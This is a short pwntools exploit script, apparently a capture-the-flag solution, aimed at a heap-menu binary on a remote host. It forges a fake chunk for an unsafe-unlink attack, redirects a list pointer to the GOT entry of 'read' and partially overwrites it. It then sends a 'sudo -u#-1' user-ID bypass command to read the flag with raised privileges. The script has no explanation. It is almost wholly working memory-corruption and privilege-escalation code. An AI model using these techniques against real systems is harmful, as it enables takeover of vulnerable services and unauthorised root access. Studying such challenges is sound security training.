from pwn import*
def menu(ch):
	p.sendline(str(ch))
	sleep(0.1)
def add(idx):
	menu(1)
	p.sendline(str(idx))
	sleep(0.1)
def edit(idx,content):
	menu(2)
	p.sendline(str(idx))
	sleep(0.1)
	p.send(content)
	sleep(0.1)
def free(idx):
	menu(3)
	p.sendline(str(idx))
	sleep(0.1)
p = process('./main')
elf =ELF('./main')
p = remote('183.129.189.60',10013)
libc = ELF('./libc-2.23.so')

LIST = 0x403480
payload  = p64(0) + p64(0xF1)
payload += p64(LIST - 0x18) + p64(LIST - 0x10)
payload  = payload.ljust(0xF0,'\x00')
payload += p64(0xF0)
add(0)
add(1)
menu(4)
edit(0,payload)
free(1)
edit(0,'\x00'*0x18 + p64(elf.got['read']))
edit(0,'\x07\x42')
pause()
p.sendline('sudo -u#-1 cat flag')
p.interactive()
